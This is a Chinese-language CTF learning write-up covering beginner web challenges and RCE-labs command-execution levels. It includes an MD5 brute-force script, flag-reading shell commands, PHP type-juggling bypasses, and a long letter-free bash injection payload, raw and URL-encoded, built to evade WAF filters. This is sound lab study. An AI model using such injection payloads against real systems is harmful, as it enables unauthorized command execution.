# 工具
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741454242595-b4ff32e5-1846-448b-afe7-0e14a740dc83.png)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741454163893-c490aed6-3a58-4457-b530-5d3a634b3334.png)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741454115703-d74aa735-19fe-44ae-b31b-bd213a421243.png)

# 找flag
~~既然提示了flag可能在文件里.所以flag就是:~~

~~flag{hello_world}或xxxctf{we1c0me!}!~~

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741345655889-63b229cb-6572-416f-8cda-1ba645247553.png)

算了,直接看.md文件源代码

flag{we1c0me_t0_CTF!}

# 题目
## <font style="background-color:rgb(247, 248, 250);">view_source</font>
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357136118-c537114e-5221-44eb-9d94-8752707eea8a.png)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357160565-9936e7a7-744c-4cd9-8931-703ceff3ffb3.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357174122-2e3cc884-cb1c-4838-a8b9-788c9108d9cd.png)

## <font style="background-color:rgb(247, 248, 250);">get_post</font>
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357252448-1ce4a510-91e7-483c-af1e-accd7c28456d.png)

## python脚本
```python
import hashlib
import itertools
import string
def find_md5_match(prefix="19ca14", max_length=6):
    chars = string.ascii_letters + string.digits  # 可选字符集（字母+数字）

    for length in range(1, max_length + 1):
        for candidate in itertools.product(chars, repeat=length):
            test_string = "".join(candidate)
            md5_hash = hashlib.md5(test_string.encode()).hexdigest()
            if md5_hash.startswith(prefix):
                print(f"找到匹配项: {test_string} -> {md5_hash}")
                return test_string
    print("未找到匹配项")
    return None
if __name__ == "__main__":
    find_md5_match()

#输出:
#找到匹配项: 36 -> 19ca14e7ea6328a42e0eb13d585e4c22
```

## <font style="background-color:rgb(247, 248, 250);">robots</font>
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441028199-fb2f8d19-6017-482e-99ae-cc04cf5159b0.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441038475-5df885e1-28a7-474d-8d3c-2889acbf02a1.png)

robots.txt文件是一个文本文件，使用任何一个常见的[文本编辑](https://baike.baidu.com/item/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91/6282252?fromModule=lemma_inlink)器，比如Windows[系统安装](https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/56370294?fromModule=lemma_inlink)了Notepad，就可以创建和编辑它<sup> </sup><sup>[1]</sup>。robots.txt是一个协议，而不是一个命令。robots.txt是[搜索引擎](https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/0?fromModule=lemma_inlink)中访问网站的时候要查看的第一个文件。robots.txt文件告诉[蜘蛛程序](https://baike.baidu.com/item/%E8%9C%98%E8%9B%9B%E7%A8%8B%E5%BA%8F/4972146?fromModule=lemma_inlink)在服务器上什么文件是可以被查看的。

当一个搜索蜘蛛访问一个站点时，它会首先检查该站点[根目录](https://baike.baidu.com/item/%E6%A0%B9%E7%9B%AE%E5%BD%95/6061330?fromModule=lemma_inlink)下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。[百度](https://baike.baidu.com/item/%E7%99%BE%E5%BA%A6/6699?fromModule=lemma_inlink)官方建议，仅当您的网站包含不希望被[搜索引擎收录](https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%94%B6%E5%BD%95/7279593?fromModule=lemma_inlink)的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。

如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。

所以直接搜robots.txt  
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441075896-8132863c-d978-47cd-a713-37f9fcc0b5e7.png)

再搜flag_ls_h3re.php就行了

# ![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441093308-8a45095d-c0ef-4e25-a2bc-84db789b4fac.png)
## <font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">backup</font>
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441350687-885d330a-2a8f-43df-bbe1-fefa7159b54b.png)

<font style="color:rgb(77, 77, 77);">如果网站存在备份文件，常见的备份文件后缀名有：“.</font><font style="color:rgb(252, 85, 49);">git</font><font style="color:rgb(77, 77, 77);">” 、“.</font>[<font style="color:rgb(252, 85, 49);">svn</font>](https://so.csdn.net/so/search?q=svn&spm=1001.2101.3001.7020)<font style="color:rgb(77, 77, 77);">”、“ .swp”“.~”、“.bak”</font>

<font style="color:rgb(77, 77, 77);">测试到.bak下载了一个文件，打开就是flag</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441384605-35f4b7ea-ca4f-44d1-a162-c4964ad9252a.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441414961-f5f11e46-c7ef-421a-9953-bd6768d51ca1.png)

## <font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">cookie</font>
hackbar找cookie

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442192048-def40780-3547-4658-a20c-a637dc7c8585.png)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442278243-6819ffe5-8309-4f3c-bb0e-e15d422083d6.png)

hackbar中mode转为raw直接看flag

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442375256-d57d8f0a-1a66-4a6c-8d2d-7c811b87446e.png)

## <font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">disabled_button</font>
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442471567-3c4f7ed5-080e-4d1d-911f-a431985b1a91.png)

我偏按，改一下这个

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442791425-e41390bf-6361-4377-8921-43f5557e60a0.png)

去掉disabled就行了

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442839493-fcaac9cf-05a1-4834-81cb-4f61bd6145d1.png)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442863075-de444b32-99cf-4f90-888d-60a72ef18df6.png)

相关知识：[HTML <input> disabled 属性](https://www.w3school.com.cn/tags/att_input_disabled.asp)

## <font style="color:rgb(29, 33, 41);">simple_js</font>
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741443805546-060b7f45-efb3-471a-8b13-f390925be0e1.png)

pass这堆数解密为<font style="color:rgb(64, 64, 64);">FAUX PASSWORD HAHA,那么这堆java代码无论怎么执行,都返回FAUX PASSWORD HAHA,但是源代码有这样的16进制数</font>![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444056540-5faf4687-27a8-45fe-b518-9bafbeb00770.png)

解码后得到786OsErtk12,盲猜flag,组合一下得到<font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);"> Cyberpeace{</font>786OsErtk12<font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">}</font>![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444165385-434f294f-768c-453d-a066-569072470d01.png)

<font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">艹,真对了</font>

## <font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">xff_referer</font>
ez_http,直接hackbar操作就行

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444249946-0a560715-e2c7-4db4-820d-d28b6cb76f75.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444270017-ae968c0b-6d2b-4c64-b1d1-39ac60e93734.png)

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444321941-3d60e355-3f15-4cee-b13f-fafd8bc4e0c5.png)

## <font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">weak_auth</font>
盲猜密码

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444420790-fea11a88-2cd2-4850-b6f2-5242828b4996.png)

nb![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444460728-b0a9f247-aab6-4a8d-9179-e1fb039a8f69.png)

算了爆破一下吧,也练习一下操作

在爆破点加载用户名和密码

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444980563-d506efd0-bfa4-43cf-a926-c4ba0b7f4f62.png)

取得一系列响应

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741445076049-427d1771-a1bf-4b18-9276-18ca2b4f2286.png)

直接找就行

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741445497436-f2e582aa-0949-4035-b071-86599ef670e1.png)

### <font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">command_execution</font>
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741445685856-463ecc85-5c21-4e43-a168-ad82904ab3ed.png)

不写waf,某些hacker会直接操作你的文件!

展示文件

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741445676979-32a9d8f8-282f-4016-ab18-9b473c2b1032.png)

到根目录![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446794846-c87f5979-69b1-4804-a94c-d88b668e6bfe.png)

找flag

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446761007-778b4021-7718-4e31-ad46-7ae9ddd648e7.png)

或者这样找也行,但是flag一被修饰就不行了

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446552073-f4084147-3287-49c8-b61f-b6a0a54fabf6.png)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446576636-43c3529b-4704-45a6-8895-8b054ad13399.png)

cat /home/flag.txt 或者nl /home/flag.txt

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446628498-052c30bf-aa80-4ee2-8420-ad462928565d.png)

## <font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">simple_php</font>
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446978252-07351b45-03e3-4e03-b2fe-43f83c9768d1.png)

原理:

a='0'中== 会先将字符串换成相同类型，再作比较，属于弱类型比较,所以$a==0成立

其次,$a的值原来是ASCLL码值,不为零,所以就绕过去了

b[]=12345被视作数组不是数字,绕过去

$b的值显然大于1234

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741447095292-8cf72102-728f-4bec-a2ef-195aa9ee283b.png)

# PHP基础
已经写过了几份笔记,还有课件,都是知识~

![](https://cdn.nlark.com/yuque/0/2025/jpeg/50616406/1741454675237-aced9a5c-5d64-4888-92f1-b0d8331325e9.jpeg)

[PHP学习及练习](https://www.yuque.com/yangfanyuanhang-0t2rm/dbb38x/mgcgb109aq54kgnr)

[PHP语言的漏洞](https://www.yuque.com/yangfanyuanhang-0t2rm/gygw48/gyi25qn9bp6qonuw)

[PHP1.pdf](https://www.yuque.com/attachments/yuque/0/2025/pdf/50616406/1741357601274-4a73363b-515c-4c50-b29a-a02ea9ed0b98.pdf)

[PHP2.pdf](https://www.yuque.com/attachments/yuque/0/2025/pdf/50616406/1741357602678-b1a6f584-7d9f-41a6-b7cd-8b89182731d6.pdf)

# REC命令执行
[0~9题在这里](https://www.yuque.com/yangfanyuanhang-0t2rm/dbb38x/gvbosz1b0tb6gahu)

之前就部署好了![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357756248-816ea714-dc55-4416-970d-c3af001d61eb.png)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357723940-59aeb6f1-c11d-4a37-bc7c-7876134dc0a7.png)

后面几题没看到**<font style="color:rgb(31, 35, 40);">get_flag.php</font>**文件,所以在nss上写了

## [RCE-labs]Level 10 - 无字母命令执行_二进制整数替换
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357939954-959b4471-f964-47df-b6f9-67ccd48bd445.png)

一开始没什么思路，看了一下writeup下载了一个使用的脚本

[https://github.com/ProbiusOfficial/bashFuck](https://github.com/ProbiusOfficial/bashFuck)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741360785399-1245e6a0-6e4a-4899-8529-4306a096e60f.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741361396291-5572ffcd-3756-4651-b94f-c9d10d3f9718.png)

脚本生成的一个palyload:

```php
Charset : # $ ' ( ) 0 < \ { }
Total Used: 10
Total length = 444
Payload = $0<<<$0\<\<\<\$\'\\$(($((${##}<<${##}))#${##}000${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}000${##}${##}0${##}))\\$(($((${##}<<${##}))#${##}0${##}00${##}00))\\$(($((${##}<<${##}))#${##}0${##}000))\\$(($((${##}<<${##}))#${##}${##}${##}00${##}))\\$(($((${##}<<${##}))#${##}00${##}00${##}0))\\$(($((${##}<<${##}))#${##}00${##}${##}0${##}0))\\$(($((${##}<<${##}))#${##}000${##}${##}0${##}))\\$(($((${##}<<${##}))#${##}00${##}00${##}${##}))\'
```

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741360934423-4324d1ac-e8be-49d5-96b9-d0d5a36743f2.png)

url编码一下

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741360955905-c1f35c9e-83a9-49d3-b582-4ad96a722a0d.png)

## [RCE-labs]Level 11 - 无字母命令执行_整数1的特殊变量替换
不是这道题有bug?传123不报WAF?看writeup也不行

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741448949940-a9815dca-0c53-4fdd-9455-d51bec500d5a.png)

上一题还正常

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741448921384-437919df-d9ef-4dec-b78f-0f48c213bf00.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741448913779-8e6da91a-ba4b-4b59-81c0-6d2e0da914ba.png)

算了给出playload吧,不知道对不对.

毕竟没有对**<font style="color:rgb(51, 51, 51);"> # $ ' ( ) 0 < \ { } </font>**<font style="color:rgb(51, 51, 51);">几项WAF,在题目给的渠道生成playload:</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741449489113-e234230f-bbd7-4a4b-acc5-0bb1d2131408.png)

url编码:

```python
%240%3C%3C%3C%240%5C%3C%5C%3C%5C%3C%5C%24%5C'%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D000%24%7B%23%23%7D%24%7B%23%23%7D%24%7B%23%23%7D%24%7B%23%23%7D))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D000%24%7B%23%23%7D%24%7B%23%23%7D0%24%7B%23%23%7D))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D0%24%7B%23%23%7D00%24%7B%23%23%7D00))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D0%24%7B%23%23%7D000))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D%24%7B%23%23%7D%24%7B%23%23%7D00%24%7B%23%23%7D))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D00%24%7B%23%23%7D00%24%7B%23%23%7D0))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D00%24%7B%23%23%7D%24%7B%23%23%7D0%24%7B%23%23%7D0))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D000%24%7B%23%23%7D%24%7B%23%23%7D0%24%7B%23%23%7D))%5C%5C%24((%24((%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D))%23%24%7B%23%23%7D00%24%7B%23%23%7D00%24%7B%23%23%7D%24%7B%23%23%7D))%5C'
```

## <font style="color:rgb(0, 0, 0);">[RCE-labs]Level 13 - 无字母命令执行_特殊扩展替换任意数字</font>
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741449804609-f0d8a68c-4dae-41c3-9578-60f73e7b9bc3.png)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741449819852-e0da65d5-0895-4593-a119-391348b46663.png)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741449813675-88adc40d-bd11-4cc4-8bf2-9c81e0ddfd89.png)

~~脚本真好用,学废了~~

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741450113853-b5a5b902-cae6-4666-b0c0-111b217eb5c8.png)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741449778425-fe87c76b-886d-4c3a-9852-d89bffdd1b24.png)

## <font style="color:rgb(0, 0, 0);">[RCE-labs]Level 14 - 7字符RCE</font>
这过滤个啥啊?代码BUG?长度都是9了啊?

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741450259057-e94b6607-4a5c-449f-979d-c5c62333b85a.png)

换一种解题方式,就满足条件了

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741450294894-6161c9e4-48bb-4611-ba8e-34a724776e22.png)

NSSCTF{fd8be297-d8d0-4909-90ef-574e11739831}



燃尽了先写到这里吧

